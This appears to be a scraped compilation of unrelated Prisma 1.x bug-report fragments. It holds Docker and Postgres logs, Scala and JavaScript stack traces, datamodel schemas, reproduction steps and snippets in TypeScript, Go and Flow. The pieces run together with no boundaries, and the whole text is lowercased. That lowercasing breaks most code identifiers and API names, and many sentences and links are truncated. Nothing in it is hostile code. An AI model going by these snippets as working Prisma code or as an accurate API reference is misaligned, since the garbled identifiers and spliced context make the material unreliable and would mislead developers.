\x1b[36mpostgres_1 |\x1b[0m 2018-12-23 22:37:31.469 utc [70] detail: key (email)=(alice@example.com) already exists.
\x1b[36mpostgres_1 |\x1b[0m 2018-12-23 22:37:31.469 utc [70] statement: insert into "default$default"."user" (
\x1b[36mpostgres_1 |\x1b[0m "id", \x1b[36mpostgres_1 |\x1b[0m "firstname", \x1b[36mpostgres_1 |\x1b[0m "lastname", \x1b[36mpostgres_1 |\x1b[0m "about", \x1b[36mpostgres_1 |\x1b[0m "email", \x1b[36mpostgres_1 |\x1b[0m "hash", \x1b[36mpostgres_1 |\x1b[0m "createdat", \x1b[36mpostgres_1 |\x1b[0m "updatedat"
\x1b[36mpostgres_1 |\x1b[0m )
\x1b[36mpostgres_1 |\x1b[0m values (
\x1b[36mpostgres_1 |\x1b[0m $1, \x1b[36mpostgres_1 |\x1b[0m $2, \x1b[36mpostgres_1 |\x1b[0m $3, \x1b[36mpostgres_1 |\x1b[0m $4, \x1b[36mpostgres_1 |\x1b[0m $5, \x1b[36mpostgres_1 |\x1b[0m $6, \x1b[36mpostgres_1 |\x1b[0m $7, \x1b[36mpostgres_1 |\x1b[0m $8
\x1b[36mpostgres_1 |\x1b[0m )
\x1b[36mpostgres_1 |\x1b[0m returning *
\x1b[35mprisma_1 |\x1b[0m {"key":"error/handled","requestid":"local:api:cjq1h3poc00120a32zi19ezon","clientid":"default$default","payload":{"exception":"com.prisma.api.schema.apierrors$uniqueconstraintviolation: a unique constraint would be violated on user
details: field name = email","query":"mutation {\ user1: createuser(data: {firstname: \\"alice\\", lastname: \\"jones\\", email: \\"alice@example.com\\", hash: \\"xxxx\\", posts: {create: [{headline: \\"a\\", topic: discussion}, {headline: \\"b\\", topic: help}, {headline: \\"c\\", topic: discussion}, {headline: \\"d\\", topic: help}]}}) {\ id\ }\ user2: createuser(data: {firstname: \\"bob\\", lastname: \\"smith\\", email: \\"bob@example.com\\", hash: \\"xxxx\\", posts: {create: [{headline: \\"x\\", topic: discussion}, {headline: \\"y\\", topic: help}, {headline: \\"z\\", topic: discussion}]}}) {\ id\ }\ }\ ","variables":"{}","code":"3010","stack_trace":"com.prisma.api.connector.jdbc.impl.createnodeinterpreter$$anonfun$1.applyorelse(createnodeinterpreters.scala:33)\\\ com.prisma.api.connector.jdbc.impl.createnodeinterpreter$$anonfun$1.applyorelse(createnodeinterpreters.scala:31)\\\ scala.partialfunction$lifted.apply(partialfunction.scala:224)\\\ scala.partialfunction$lifted.apply(partialfunction.scala:220)\\\ com.prisma.api.connector.jdbc.databasemutactioninterpreter.$anonfun$applyerrormapper$1(nesteddatabasemutactioninterpreter.scala:21)\\\ slick.basic.basicbackend$databasedef.$anonfun$runincontextinline$1(basicbackend.scala:171)\\\ scala.concurrent.future.$anonfun$flatmap$1(future.scala:302)\\\ scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)\\\ akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)\\\ scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)\\\ scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)\\\ akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)\\\ akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)\\\ akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)\\\ akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)\\\ akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)\\\ akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)\\\ akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)","message":"a unique constraint would be violated on user
details: field name = email"}}
\x1b[31mbuild-dev_1 |\x1b[0m $ /home/workdir/node_modules/.bin/ts-node src/seed.ts src/seed.graphql
\x1b[31mbuild-dev_1 |\x1b[0m connecting to prisma on
\x1b[31mbuild-dev_1 |\x1b[0m opening file
\x1b[31mbuild-dev_1 |\x1b[0m opened file
\x1b[31mbuild-dev_1 |\x1b[0m request to
\x1b[31mbuild-dev_1 |\x1b[0m query:
\x1b[31mbuild-dev_1 |\x1b[0m mutation {
\x1b[31mbuild-dev_1 |\x1b[0m user1: createuser(data: {firstname: "alice", lastname: "jones", email: "alice@example.com", hash: "xxxx", posts: {create: [{headline: "a", topic: discussion}, {headline: "b", topic: help}, {headline: "c", topic: discussion}, {headline: "d", topic: help}]}}) {
\x1b[31mbuild-dev_1 |\x1b[0m id
\x1b[31mbuild-dev_1 |\x1b[0m }
\x1b[31mbuild-dev_1 |\x1b[0m user2: createuser(data: {firstname: "bob", lastname: "smith", email: "bob@example.com", hash: "xxxx", posts: {create: [{headline: "x", topic: discussion}, {headline: "y", topic: help}, {headline: "z", topic: discussion}]}}) {
\x1b[31mbuild-dev_1 |\x1b[0m id
\x1b[31mbuild-dev_1 |\x1b[0m }
\x1b[31mbuild-dev_1 |\x1b[0m }
\x1b[31mbuild-dev_1 |\x1b[0m operationname: null
\x1b[31mbuild-dev_1 |\x1b[0m variables:
\x1b[31mbuild-dev_1 |\x1b[0m {}
\x1b[31mbuild-dev_1 |\x1b[0m [graphql error]: message: a unique constraint would be violated on user
details: field name = email, location: [object object], path: user1
\x1b[31mbuild-dev_1 |\x1b[0m [network error]: error: a unique constraint would be violated on user
details: field name = email
\x1b[31mbuild-dev_1 |\x1b[0m error in seeding
\x1b[31mbuild-dev_1 |\x1b[0m [ { error: a unique constraint would be violated on user
details: field name = email
\x1b[31mbuild-dev_1 |\x1b[0m at batchedgraphqlclient.<anonymous> (/home/workdir/node_modules/http-link-dataloader/src/batchedgraphqlclient.ts:74:13)
\x1b[31mbuild-dev_1 |\x1b[0m at step (/home/workdir/node_modules/http-link-dataloader/dist/src/batchedgraphqlclient.js:40:23)
\x1b[31mbuild-dev_1 |\x1b[0m at object.next (/home/workdir/node_modules/http-link-dataloader/dist/src/batchedgraphqlclient.js:21:53)
\x1b[31mbuild-dev_1 |\x1b[0m at fulfilled (/home/workdir/node_modules/http-link-dataloader/dist/src/batchedgraphqlclient.js:12:58)
\x1b[31mbuild-dev_1 |\x1b[0m at <anonymous>
\x1b[31mbuild-dev_1 |\x1b[0m at process._tickdomaincallback (internal/process/next_tick.js:229:7)
\x1b[31mbuild-dev_1 |\x1b[0m message: 'a unique constraint would be violated on user
details: field name = email',
\x1b[31mbuild-dev_1 |\x1b[0m locations: [ [object] ],
\x1b[31mbuild-dev_1 |\x1b[0m path: [ 'user1' ] } ]
\x1b[31mbuild-dev_1 |\x1b[0m info visit for documentation about this command.
\x1b[31mbuild-dev_1 |\x1b[0m \x1b[31mbuild-dev_1 |\x1b[0m error command failed with exit code 1.
\x1b[31mbuild-dev_1 |\x1b[0m \x1b[31mbuild-dev_1 |\x1b[0m [22:37:31] 'seed' errored after 1.79 s
\x1b[31mbuild-dev_1 |\x1b[0m [22:37:31] error: command failed: yarn ts-node src/seed.ts src/seed.graphql
\x1b[31mbuild-dev_1 |\x1b[0m error command failed with exit code 1.
\x1b[31mbuild-dev_1 |\x1b[0m \x1b[31mbuild-dev_1 |\x1b[0m at childprocess.exithandler (child_process.js:276:12)
\x1b[31mbuild-dev_1 |\x1b[0m at emittwo (events.js:126:13)
\x1b[31mbuild-dev_1 |\x1b[0m at childprocess.emit (events.js:214:7)
\x1b[31mbuild-dev_1 |\x1b[0m at maybeclose (internal/child_process.js:915:16)
\x1b[31mbuild-dev_1 |\x1b[0m at process.childprocess._handle.onexit (internal/child_process.js:209:5)
\x1b[31mbuild-dev_1 |\x1b[0m [22:37:31] 'build-dev' errored after 8.01 s
\x1b[31mbuild-dev_1 |\x1b[0m error command failed with exit code 1.
\x1b[31mbuild-dev_1 |\x1b[0m info visit for documentation about this command.
\x1b[31mbuild-dev_1 |\x1b[0m 2018/12/23 22:37:31 command exited with error: exit status 1
\x1b[32mdev_build-dev_1 exited with code 1
go to `line 58` in following code, and find this comment `# to get error, uncomment these four lines (`matchcondition` field)`
uncomment the field definition `matchcondition: collectionautocurationrulecondition!`
`prisma deploy` will fail!
error: `error: whoops
looks like an internal server error
search your server logs for request id: eu1:cjq179ltrsov80a55tl1iivmq` ```
type collection { """ id """ id: id! @unique """ title of the collection """ title: string! """ description of this collection """ description: string """ collection will be published on this date and time (in the future from now) """ livefrom: datetime! """ collection will be published till this date and time (in the future after livefrom\'s time) """ livetill: datetime """ rules for "initial" automatic curation of this collection """ autocurationrules: [collectionautocurationrule!]! @relation(name: "collectionautocurationrules", ondelete: cascade) """ apply all rules in conjunction or disjunction """ applyallrules: boolean! @default(value: "false") """ created at this time """ createdat: datetime! """ updated at this time """ updatedat: datetime!
} type collectionautocurationrule { """ id """ id: id! @unique """ one of the rules for this collection """ collection: collection! @relation(name: "collectionautocurationrules", ondelete: set_null) """ matching rule is applied on this type """ matchthis: collectionautocurationrulematch! # to get error, uncomment these four lines (`matchcondition` field) # """ # condition of this rule # """ # matchcondition: collectionautocurationrulecondition! """ match type to this value """ matchto: string! """ created at this time """ createdat: datetime! """ updated at this time """ updatedat: datetime!
} type collectionautocurationrulematch { """ id """ id: id! @unique """ match condition against this """ match: string! @unique # tag, category, etc
""" created at this time """ createdat: datetime! """ updated at this time """ updatedat: datetime!
} type collectionautocurationrulecondition { """ id """ id: id! @unique """ condition of this rule """ condition: string! @unique # e.g
is_equal_to, starts_with, etc
""" created at this time """ createdat: datetime! """ updated at this time """ updatedat: datetime!
a minimal example with reproduction steps is provided here: i provide excerpts of the most pertinent files below: `datamodel.prisma` ```
type user { id: id! @unique macguffins: [macguffin!]!
} type macguffin { id: id! @unique owners: [user!]!
``` `index.js` ```
const { prisma } = require('./generated/prisma-client/index'); async function main() { prisma.deletemanyusers(); prisma.deletemanymacguffins(); const user1 = await prisma.createuser({}); const user2 = await prisma.createuser({}); const macguffin1 = await prisma.createmacguffin({ owners: { connect: { id: user1.id } } }); const macguffin2 = await prisma.createmacguffin({ owners: { connect: { id: user2.id } } }); const querymcguffins1 = await prisma.macguffins({ where: { or: { id: macguffin2.id, owners_some: { id: user1.id } } }}); console.log(querymcguffins1); const querymcguffins2 = await prisma.macguffins({ where: { or: { owners_some: { id: user1.id } } }}); console.log(querymcguffins2);
} main().catch(e => console.error(e));
``` **example output:** ```
$ node index.js
[ { id: 'cjq0vvfkj9gkj0a61nwxfdoj6' } ]
``` **expected output (example)** ```
$ node index.js
[ { id: 'cjq0vvfkj9gkj0a61nwxfdoj6' } ]
[ { id: 'cjq0vvfkj9gkj0a61nwxfdoj6' } ]
compose docker along with postgres db setting and run docker container
prisma introspect in cli
prisma deploy
shows error
`error: the provided name: account_messageboxes_receivers is not a valid name for a relation
it can only have up to 54 characters and must have the shape [a-z][a-za-z0-9]*`
consider the follow model: ```graphql
type todo { id: id! @unique task: string! concludedat: datetime
``` observe `concludedat` is a nullable field.
i can set `concludedat` normally using the go client
updatetodo(prisma.todoupdateparams{ where: prisma.todowhereuniqueinput{id}, data: prisma.todoupdateinput{ concludedat: now(), },
}).exec(ctx)
``` but i can't set to null, after execute this code nothing happens ```go
updatetodo(prisma.todoupdateparams{ where: prisma.todowhereuniqueinput{id}, data: prisma.todoupdateinput{ concludedat: nil, },
}).exec(ctx)
npm update -g prisma prisma init server
? set up a new prisma server or deploy to an existing server? create new database
? what kind of database do you want to deploy to? postgresql
? select the programming language for the generated prisma client prisma typescript client
docker-compose up
create table table_a ( id uuid not null primary key, name text
); create table table_b ( id uuid not null primary key, a_id uuid references table_a(id)
); insert into table_a (id, name) values ('ab6981ee-02e8-4d3c-87a1-08d45ebd8b03', 'test');
insert into table_b (id, a_id) values ('5ac8367d-702e-4eff-b3fe-edfd9490c967', null);
``` ***prisma data model***
type tablea @pgtable(name: "table_a") { id: uuid! @unique name: string!
} type tableb @pgtable(name: "table_b") { id: uuid! @unique a: tablea @pgrelation(column: "a_id")
``` ***graphql query***
query { tablebs { id a { id } }
``` ***exception***
java.lang.nullpointerexception at java.util.uuid.fromstring(uuid.java:192) at com.prisma.gc_values.uuidgcvalue$.$anonfun$parse$1(gcvalues.scala:89) at scala.util.try$.apply(try.scala:209) at com.prisma.gc_values.uuidgcvalue$.parse(gcvalues.scala:89) at com.prisma.gc_values.uuidgcvalue$.parse_$bang(gcvalues.scala:88) at com.prisma.api.connector.jdbc.extensions.jdbcextensionsvalueclasses$resultsetextensions$.getgcvalue$extension(jdbcextensions.scala:68) at com.prisma.api.connector.jdbc.database.resultsetreaders.$anonfun$readprismanode$1(resultsetreaders.scala:29) at scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234) at scala.collection.iterator.foreach(iterator.scala:929) at scala.collection.iterator.foreach$(iterator.scala:929) at scala.collection.abstractiterator.foreach(iterator.scala:1417) at scala.collection.iterablelike.foreach(iterablelike.scala:71) at scala.collection.iterablelike.foreach$(iterablelike.scala:70) at scala.collection.abstractiterable.foreach(iterable.scala:54) at scala.collection.traversablelike.map(traversablelike.scala:234) at scala.collection.traversablelike.map$(traversablelike.scala:227) at scala.collection.abstracttraversable.map(traversable.scala:104) at com.prisma.api.connector.jdbc.database.resultsetreaders.readprismanode(resultsetreaders.scala:29) at com.prisma.api.connector.jdbc.database.resultsetreaders.$anonfun$readsprismanode$1(resultsetreaders.scala:25) at com.prisma.slick.readsresultset$$anon$1.read(resultsetextensions.scala:16) at com.prisma.slick.resultsetextensionsvalueclasses$resultsetextensions2$.readwith$extension(resultsetextensions.scala:31) at com.prisma.api.connector.jdbc.database.nodemanyqueries.$anonfun$getnodes$2(nodemanyqueries.scala:20) at com.prisma.connector.shared.jdbc.sharedslickextensions.$anonfun$querytodbio$1(sharedslickextensions.scala:15) at com.prisma.connector.shared.jdbc.sharedslickextensions.$anonfun$jooqtodbio$1(sharedslickextensions.scala:62) at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70) at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69) at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275) at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
`docker-compose.yml` (copied from 1.22 docs, unchanged): ```yml
version: '3'
services: prisma: image: prismagraphql/prisma:1.22 restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 databases: default: connector: mongo uri: mongodb://prisma:prisma@mongo mongo: image: mongo:3.6 restart: always environment: mongo_initdb_root_username: prisma mongo_initdb_root_password: prisma ports: - "27017:27017" volumes: - mongo:/var/lib/mongo
volumes: mongo:
`datamodel.graphql`: (a simplified version from the 1.22 docs) ```graphql
type user { id: id! @id name: string! posts: [post!]! @relation(link: inline)
} type post { id: id! @id title: string! author: user
check prisma's playground via port 4466: ![image]( in the `where` condition of the `users` query, only `id` and `name` related conditions are allowed
**we cannot query users by posts, which makes the new mongodb connector basically useless.**
create primsa server
initialize a new prisma project via `prisma init`
select your newly created server
run `prisma deploy`
using a exist database with a 1-n direct relation
(maybe also need a table contain both foreign key)
specify n above and query.
change the order and query again.
set this as prisma.yml
endpoint: {self:custom.name}
datamodel: datamodel.graphql
secret: ${self:custom.endpoint-secret} generate: - generator: typescript-client output: ../src/generated/prisma-client/ - generator: graphql-schema output: ../src/generated/prisma-client/ custom: endpoint-secret: ${env:prisma_endpoint_secret} name: ${env:prisma_deployment_uid}
use types schema.graphql
scalar datetime type query { post(id: id!): post posts: [post!]! filterposts(searchstring: string): [post!]!
} type mutation { createdraft(title: string!, content: string, authoremail: string!): post deletepost(id: id!): post publish(id: id!): post
} type post { id: id! createdat: datetime! updatedat: datetime! published: boolean! title: string! content: string author: user!
} type query { user(id: id!): user users: [user!]!
} type mutation { signupuser(email: string!, name: string): user deleteuser(id: id!): user
} type user { id: id! email: string! name: string posts: [post!]!
``` datamodel.graphql
type user { id: id! @id email: string! @unique name: string posts: [post!]! @relation(link: inline)
} type post { id: id! @id createdat: datetime! @createdat updatedat: datetime! @updatedat published: boolean! @default(value: false) title: string! content: string author: user!
} ``` the associated resolver for author of post
```typescript
import { postresolvers } from '../generated/graphqlgen'; export const post: postresolvers.type = { ...postresolvers.defaultresolvers, author: ({ id }, args, ctx) => ctx.prisma.post({ id }).author(),
`prisma deploy` + `prisma generate` + `graphqlgen`
`signupuser` a user, `createdraft` then `publish` it.
query the posts
query { posts { author { name } }
if i name a type `abctype`, it will produce the following code: ```
func (instance *abctypesubscriptionpayloadexec) node() *abctypeexec {
``` however, `abctypeexec` is _actually_ defined as
type abctypeexec struct { exec *prisma.exec
``` produces error > undefined: abctypeexec
this happens for both flow examples in the `prisma-examples` repo: - [script](
- [graphql]( you can follow the instructions in the readme of each example to set it up
then run `npm run flow` to invoke the type-checking
this the error that's produced both times: ```
$ npm run flow > script@ flow /users/nikolasburk/prisma/github/prisma-examples/flow/script
> flow launching flow server for /users/nikolasburk/prisma/github/prisma-examples/flow/script
spawned flow server (pid=60267)
logs will go to /private/tmp/flow/zsuserszsnikolasburkzsprismazsgithubzsprisma-exampleszsflowzsscript.log
monitor logs will go to /private/tmp/flow/zsuserszsnikolasburkzsprismazsgithubzsprisma-exampleszsflowzsscript.monitor_log
error node_modules/graphql/utilities/buildastschema.js.flow:363:9 missing type annotation for v
v is a type parameter declared in function [1] and was implicitly instantiated at call of
keyvalmap [2]
node_modules/graphql/utilities/buildastschema.js.flow 360 def: objecttypedefinitionnode | interfacetypedefinitionnode, 361 ) { 362 return def.fields [2] 363 ? keyvalmap( 364 def.fields, 365 field => field.name.value, 366 field => this.buildfield(field), 367 ) 368 : {}; 369 } 370 node_modules/graphql/jsutils/keyvalmap.js.flow [1] 29 export default function keyvalmap<t, v>( 30 list: $readonlyarray<t>, 31 keyfn: (item: t) => string, 32 valfn: (item: t) => v, 33 ): objmap<v> { error node_modules/graphql/utilities/buildastschema.js.flow:372:12 missing type annotation for v
v is a type parameter declared in function [1] and was implicitly instantiated at call of
keyvalmap [2]
node_modules/graphql/utilities/buildastschema.js.flow 369 } 370 371 _makeinputvalues(values: $readonlyarray<inputvaluedefinitionnode>) { [2] 372 return keyvalmap( 373 values, 374 value => value.name.value, 375 value => this.buildinputfield(value), 376 ); 377 } 378 379 _makeinterfacedef(def: interfacetypedefinitionnode) { node_modules/graphql/jsutils/keyvalmap.js.flow [1] 29 export default function keyvalmap<t, v>( 30 list: $readonlyarray<t>, 31 keyfn: (item: t) => string, 32 valfn: (item: t) => v, 33 ): objmap<v> { error node_modules/graphql/utilities/buildastschema.js.flow:399:9 missing type annotation for v
v is a type parameter declared in function [1] and was implicitly instantiated at call of
keyvalmap [2]
node_modules/graphql/utilities/buildastschema.js.flow 396 397 _makevaluedefmap(def: enumtypedefinitionnode) { 398 return def.values [2] 399 ? keyvalmap( 400 def.values, 401 enumvalue => enumvalue.name.value, 402 enumvalue => this.buildenumvalue(enumvalue), 403 ) 404 : {}; 405 } 406 node_modules/graphql/jsutils/keyvalmap.js.flow [1] 29 export default function keyvalmap<t, v>( 30 list: $readonlyarray<t>, 31 keyfn: (item: t) => string, 32 valfn: (item: t) => v, 33 ): objmap<v> { found 3 errors
npm err! code elifecycle
npm err! errno 2
npm err! script@ flow: `flow`
npm err! exit status 2
npm err! failed at the script@ flow script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
npm err! a complete log of this run can be found in:
npm err! /users/nikolasburk/.npm/_logs/2018-11-28t16_41_37_529z-debug.log
use `flow-client` generator
run `prisma deploy`
be logged in to prisma cli
have a deployed server protected by a `managementapisecret`
try to perform `prisma deploy`
creating stage dev for service heroku-database error: authentication token is invalid: token can't be decoded: invalid signature for this token or wrong algorithm
{ "data": { "addproject": null }, "errors": [ { "locations": [ { "line": 2, "column": 9 } ], "path": [ "addproject" ], "code": 3015, "message": "authentication token is invalid: token can\'t be decoded: invalid signature for this token or wrong algorithm.", "requestid": "local:management:cjofwmfmt00050684141qxrsn" } ], "status": 200
create user type as ```graphql
type user { id: id! @unique firstname: string lastname: string email: string! @unique createdat: datetime! updatedat: datetime! archivedat: datetime @default(value: null)
add prisma.yml as follows
endpoint: ${env:prisma_url}
secret: ${env:prisma_secret}
datamodel: - ./src/core/user/user.prisma generate: - generator: typescript-client output: ./src/prisma
create resolver
```ts @mutation() async updateuser(@args() args): promise<user> { return prisma.updateuser(args); } @subscription('user') onusermutation() { return { subscribe: async (parent, args, context) => { return prisma.$subscribe.user(args); }, resolve: (payload) => { console.log('payload', payload); return payload; }, }; }
deploy schema using `prisma deploy` 5
go to playground hosted prisma.io by and do subscribe using
subscription { user { node{ id firstname lastname email createdat updatedat archivedat } mutation updatedfields previousvalues { id firstname lastname email createdat updatedat archivedat } }
add mutation using following
mutation { updateuser(data: { lastname: "testlastname" }, where: { email: "user@example.com" }) { id firstname lastname email createdat updatedat archivedat }
repeat steps 5 and 6 by going to local graphql playground at
create a resolver calling a connection query
deploy this datamodel: ```graphql
type loan { id: id! @unique items: [loanitem!]! @relation(name: "loanitems", ondelete: cascade) by: user! @relation(name: "requestedloans") for: user! @relation(name: "receivedloans")
} type loanitem { id: id! @unique category: category loan: loan! @relation(name: "loanitems")
} type category { id: id! @unique name: string!
} type user { id: id! @unique name: string!
``` create data such that: - there is one `loan` (let's call it `a`) with two `loanitems` for the `items` relation - one `loanitem` (`x`) has a relation for the `category` field - the other `loanitem` (`y`) has no relation for the `category` field, i.e
it's `null` then run the following mutation: ```graphql
mutation { deletemanyloans( where: { items_some: { category: null } } ) { count }
``` this should work but fails with the error: `the change you are trying to make would violate the required relation \'loanitems\' between loan and loanitem"` presumably prisma tries to delete `a` first (i.e
before deleting `x` and `y`) but then fails because `x` and `y` have required relations to `a`.
use prisma docker image `1.22-alpha` can you guys patch the docker images instead of only overriding the minor version?
type profile { id: id! username: string! @unique password: string!
``` generated type
type profilewhereuniqueinput struct { id *string `json:"id,omitempty"` username *string `json:"username,omitempty"`
} ``` invocation
userstr := "test"
profile, profileerr := client.profile(prisma.profilewhereuniqueinput{username: &userstr}).exec(ctx)
{ "errormessage": "graphql: variable \'$where\' expected value of type \'profilewhereuniqueinput!\' but got: {\\"username\\":\\"test\\"}
reason: 'username' field 'username' is not defined in the input type 'profilewhereuniqueinput'
(line 1, column 15):\ query profile($where: profilewhereuniqueinput!) {\ ^", "errortype": "grapherr"
i'm unable to reproduce, as this error happens on every 2-3rd run, just randomly.
i haven't been able to create a small reproducible test case,
run a simple `--version` call and note how long it takes: ```
$ time prisma --version
0.85s user 0.13s system 2.064 total
``` in comparison: ```sh
$ time grep --version
0.00s user 0.00s system 0.008 total # and a little bit more fairly
$ time npm --version
0.18s user 0.05s system 0.272 total
``` grep is logs almost instantly, but even npm (which is also written in js) is 10x faster.
create a new local prisma deployment using the instructions listed [here]( #read-and-write-data-using-the-prisma-client) for the typescript default config.
`docker-compose up -d`
`prisma deploy`
`prisma generate`
host prisma server on heroku
do something on it
watch the r14 errors flood the server logs
generate a flow client
try to use `prisma.$exist.type({})`
get flow error, but code works
switch to `prisma.$exist.type({})` (note the case change)
flow error goes away, but code doesn't work anymore
create a basic project with a `foo` type.
`yarn prisma generate`
inspect the generated typescript:
```typescript
export interface prisma { foo: (where: foowhereuniqueinput) => foopromise; ...
export interface foopromise extends promise<foo>, fragmentable { id: () => promise<id_output>; createdat: () => promise<datetimeoutput>; updatedat: () => promise<datetimeoutput>;
note that `foopromise` extends `promise<foo>` and not `promise<foo | null>`.
i've set up a repo to reproduce the error: 1
clone the repo
start up the docker image
deploy with prisma
new installed macos mojave, install homebrew, install prisma via homebrew, install docker ce, signed in docker, run `prisma init abc`, choose all options, throw error.
use following schema:
type kintoblock @embedded
{ blockid: string! @unique name: string! versionname: string! versiontype: string! buildid: string! commitsha: string! proxyport: int! protocol: protocol!
} type deployment @db(name: "deployments")
{ id: id! @unique createdat: datetime! @createdat updatedat: datetime! @updatedat deploymentid: string! deploymentname: string! environmentid: string! environmentname: string! kintoblocks: [kintoblock!]!
run `prisma generate` see generated code is only returning client.getone, versus getmany ```
type deploymentexec struct { exec *prisma.exec
} func (instance *deploymentexec) kintoblocks() *kintoblockexec { ret := instance.exec.client.**getone**( instance.exec, nil, [2]string{"", "kintoblock"}, "kintoblocks", []string{"blockid", "name", "versionname", "versiontype", "buildid", "commitsha", "proxyport"}) return &kintoblockexec{ret}
add a schema with some relationships
try to write a mutation query that connects or creates multiple things at once
## multiple path resolution *(prisma 15.3 and test with prisma 20.1)* received an error when try to query parents data for two types but with one missing in the first type
error message received from query: "whoops
looks like an internal server error
search your server logs for request id: local:api:{id}" **repoducibility/probability :** always fail ## to reproduce:
**clone the repository:**
git clone
cd multiplepathresol/
npm install **start the server**
npm-run prisma deploy **get prisma token and copy in the index.js**
npm-run prisma token **run test**
node index.js **result of test** **test1**
create 1 group with a car and a truck.
create 1 characteristic with the previous car and previous truck.
query the previous group and get the same parents data for the car and truck.
**ok** **test2**
create 1 group with a car and a truck.
create 1 characteristic with the previous car and previous truck.
query the previous group and get different parents data for the car and truck.
**ko** observe trace received from query : "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjoa36t7ia8zr0986iat ", "path": [ "ko", "truck", "referencedbycharacteristicdatas", 0, "parentcharacteristic", "name" ],
setup a project with `prisma init` workflow
create a datamodel with type named `news`
run `prisma generate`
create a new server using heruko(i am doing it this way)
type processresource { roles: [string!]!
``` fill the table with some data, then try to delete data and boom!
use the latest beta: `prisma/1.20.0-beta.22` 1
create new project: `prisma init`
generate the ts client and deploy to a demo server
update the data model to this and deploy afterwards and regenerate the client afterwards: ```graphql type post { id: id! @unique createdat: datetime! updatedat: datetime! title: string! published: boolean! @default(value: "false") author: user comments: [comment!]! } type user { id: id! @unique name: string email: string! @unique role: role! @default(value: "user") posts: [post!]! comments: [comment!]! } type comment { id: id! @unique createdat: datetime! text: string! post: post! writtenby: user! } enum role { user admin } ```
try to run the following ts code in a script: ```ts import { prisma } from "../generated/prisma-client"; async function main() { const posts = prisma.user({ email: "alice@priasma.io" }).posts() } main(); ```
it yields the error: `property 'comments' does not exist on type 'post'.` here's what my `package.json` looks like: ```json
{ "devdependencies": { "ts-node": "^7.0.1", "typescript": "^3.1.4" }, "dependencies": { "graphql": "0.13", "graphql-tools": "^4.0.3", "prisma-client-lib": "^1.19.1" }, "scripts": { "ts-node": "ts-node", "start": "ts-node ./src/index.ts" }
update to 1.19.1
re-generate the javascript client
try to use `prisma.updatemany...`
enum letter { a b
type data { id: id! @unique createdat: datetime! letter: letter!
setup a project with prisma init
update datamodel to match the above one
run `prisma generate` this generates various deviations as well as an empty input type, in this specific case `licensecreatewithoutuserinput` is generated empty (since the relation is required) and should not be generated at all.
brew tap prisma/prisma
brew install prisma
run `prisma init new-folder`
restore the database [db.sql](
download the [github project](
open the project in visual code
start the docker container --> `docker-compose up -d`
deploy prisma --> `prisma deploy`
open graphql playground --> ` `
execute the mutation [mutation_creataarticulo.txt](
open the docker browser to display the container log
look at the error
as seen in the error when executing the mutation, the id_menu passes as null so the record is not inserted in the database
setup a new project using `prisma deploy` and **generate typescript client**
deploy this `datamodel.graphql`: ```graphql
type user { id: id! @unique name: string!
run `prisma playground`: ```graphql
subscription { user(where: {where: { mutation_in: created }}) { node { id } }
``` the playground (the prisma api) returns this error: ```
{ "error": { "message": "argument \'where\' expected type \'usersubscriptionwhereinput\' but got: {where: {mutation_in: created}}
reason: 'where' field 'where' is not defined in the input type 'usersubscriptionwhereinput'
(line 2, column 15):\ user(where: {where: {mutation_in: created}}) {\ ^\ (line 2, column 16):\ user(where: {where: {mutation_in: created}}) {\ ^" }
``` **this is expected**
run `prisma generate` again
in a `graphql-yoga` server, define this subscription resolver: ```typescript resolvers: { subscription: { newuser: { subscribe: (parent, args, ctx) => { return ctx.db.$subscribe.user({ where: { mutation_in: 'created' } }).node() } } },
now, against your typescript graphql server run the subscription `newuser`.
observe that no error is returned.
clone [this repo]( and follow instructions in the readme.md
`~ $ git clone ` in your gopath
2.` ~ $ cd prisma-go-hackernews2`
`prisma-go-hackernews2 $ docker-compose up -d`
`prisma-go-hackernews2 $ cd prisma`
`prisma $ prisma deploy`
try to modify the code preferably with a relation like user().votes() to see the that autocomplete is broken (or not)
run ``` const a = await prisma.$graphql(`query { users { id } }`) console.log(a)
``` the error will be printed: ```
typeerror: prisma.$graphql is not a function
``` the same for `prisma.request`, `prisma.request` and `prisma.graphql`
to the best of my knowledge, it should be `prisma.$graphql`.
install beta: `1.18.0-beta.16`
run `prisma generate` for a flow application
notice that the generated prisma client is missing the import for `documentnode`
generate a go client with environment variables
try to use the client
install prisma globally in windows 2
run prisma init
see error cannot find module ps-node
go to prisma playground
run a query like
query users { users( orderby: numfollowers_desc, after: null, first: 3) { id numfollowers }
``` take id of the last item and run the same query again, passing inside the `after`
notice that the returned list is empty.
open git bash
run `prisma init`
press down arrow
see that nothing happens
go to
just click "get started" at the side bar
$ prisma init myproj
? set up a new prisma server or deploy to an existing server? use existing database
? what kind of database do you want to deploy to? mysql
? does your database contain existing data? no
? enter database host 127.0.0.1
? enter database port 3306
? enter database user root
? enter database password connecting to database..
error: could not connect to database
